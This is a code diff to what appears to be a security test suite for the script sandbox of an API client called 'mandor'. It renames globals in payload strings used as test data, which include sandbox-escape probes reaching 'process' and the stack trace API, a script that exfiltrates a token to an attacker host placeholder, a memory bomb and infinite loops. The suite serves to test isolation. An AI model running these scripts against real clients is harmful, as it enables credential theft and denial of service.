@@ -64,7 +64,7 @@ export function escapeBatch(evilHttp) {
         'tried("ctor", () => typeof constructor.constructor("return process")());',
         'tried("stack", () => { Error.prepareStackTrace = (a, s) => s; return new Error().stack; });',
         `tried("fs", () => ${plant});`,
-        `await sendRequest({ url: '${evilHttp}${ATTACK.sentPath}', method: 'GET' });`,
+        `await mandor.sendRequest({ url: '${evilHttp}${ATTACK.sentPath}', method: 'GET' });`,
         `console.log('${ATTACK.marks.batch}');`,
     ].join('\n');
 }
@@ -73,19 +73,19 @@ export function escapeBatch(evilHttp) {
 export function syncScripts(evilHttp) {
     return {
         folder: [
-            'request.headers.set("X-Folder", "{{token}}");',
+            'mandor.request.headers.set("X-Folder", "{{token}}");',
             `console.log('${ATTACK.marks.folder}');`,
         ].join('\n'),
         steal: [
-            'const got = vars.get("token");',
-            'request.headers.set("X-Got", String(got));',
-            'vars.set("copia", "{{token}}");',
-            'request.headers.set("X-Copy", "{{copia}}");',
-            `request.url = '${evilHttp}${ATTACK.stealPath}';`,
+            'const got = mandor.variables.get("token");',
+            'mandor.request.headers.set("X-Got", String(got));',
+            'mandor.variables.set("copia", "{{token}}");',
+            'mandor.request.headers.set("X-Copy", "{{copia}}");',
+            `mandor.request.url = '${evilHttp}${ATTACK.stealPath}';`,
             `console.log('${ATTACK.marks.steal}');`,
         ].join('\n'),
         redirect: [
-            'request.headers.set("X-Next", "next");',
+            'mandor.request.headers.set("X-Next", "next");',
             `console.log('${ATTACK.marks.redirect}');`,
         ].join('\n'),
         loop: `console.log('${ATTACK.marks.loop}');\nwhile (true) {}`,
@@ -111,18 +111,18 @@ export function asyncScripts(evilHttp) {
     return {
         spy: escapeBatch(evilHttp),
         siphon: [
-            'request.query.set("q", "{{token}}");',
+            'mandor.request.query.set("q", "{{token}}");',
             `console.log('${ATTACK.marks.siphon}');`,
         ].join('\n'),
         echo: [
             `console.log('${ATTACK.marks.echo}');`,
             'for (let index = 0; index < 120; index += 1) {',
-            '  socket.send(message.text + " " + String(index));',
+            '  mandor.socket.send(mandor.message.text + " " + String(index));',
             '}',
         ].join('\n'),
         loop: `console.log('${ATTACK.marks.loop}');\nwhile (true) {}`,
         bomb: [
-            'if (message.text === "boom") {',
+            'if (mandor.message.text === "boom") {',
             '  const a = [];',
             '  while (true) { a.push("x".repeat(1024 * 1024)); }',
             '}',
